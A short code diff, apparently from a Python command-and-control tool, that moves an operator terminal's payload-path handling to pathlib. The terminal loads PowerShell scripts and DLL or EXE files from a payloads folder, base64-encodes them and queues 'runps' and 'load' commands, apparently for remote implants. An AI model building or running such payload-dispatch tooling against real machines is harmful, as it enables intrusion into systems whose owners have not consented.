@@ -1,16 +1,16 @@
 import base64
 import os
+from pathlib import Path;
 
 class Terminal():
-    #WORK TO DO LATER move over to pathlib for better support
-    payloadspath = os.path.dirname(os.path.realpath(__file__)) + "/../payloads/"
+    payloadspath = Path(__file__).parent.parent.joinpath("payloads")
     def listen(self, commands):
         while True:
             try:
                 cmd = input()
                 splits = cmd.split(" ")
                 if splits[0] == "runps":
-                    data = open(self.payloadspath + splits[1] + ".ps1","rb").read()
+                    data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".ps1")),"rb").read()
                     b64 = base64.b64encode(data)
                     cmd = b"runps " + b64
                     for each in splits[2:]:
@@ -18,9 +18,9 @@ class Terminal():
                 if splits[0] == "load":
                     data = b""
                     try:
-                        data = open(self.payloadspath + splits[1] + ".dll","rb").read()
+                        data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".dll")),"rb").read()
                     except:
-                        data = open(self.payloadspath + splits[1] + ".exe","rb").read()
+                        data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".exe")),"rb").read()
                     b64 = base64.b64encode(data)
                     cmd = b"load " + b64 + b" " + splits[1].encode()
                 commands.put(cmd)
